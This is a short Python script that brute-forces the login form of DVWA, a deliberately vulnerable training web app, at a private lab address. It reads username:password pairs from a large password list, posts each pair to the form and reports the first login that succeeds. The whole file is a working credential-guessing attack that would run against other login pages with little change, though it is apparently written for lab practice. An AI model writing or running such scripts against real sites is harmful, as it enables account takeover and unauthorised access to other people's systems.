#!/usr/bin/env python
import requests

target_url = "http://10.0.2.33/dvwa/login.php"

with open("/home/kali/Downloads/10-million-password-list-top-1000000.txt", "r") as credentials_file:
    for line in credentials_file:
        # Split the line into parts using ':' as a separator
        parts = line.strip().split(':')

        # Check if there are enough parts (username and password)
        if len(parts) >= 2:
            username = parts[0]
            password = ':'.join(parts[1:])  # In case the password contains ':'

            data_disc = {"username": username, "password": password, "Login": "submit"}

            with requests.Session() as session:
                response = session.post(target_url, data=data_disc)

                # Check if login was successful based on the status code
                if response.status_code == 200 and "Login failed" not in response.content.decode('utf-8'):
                    print("[+] Found credentials >>>>>> Username: {}, Password: {}".format(username, password))
                    exit()

print("[+] Correct credentials not found")
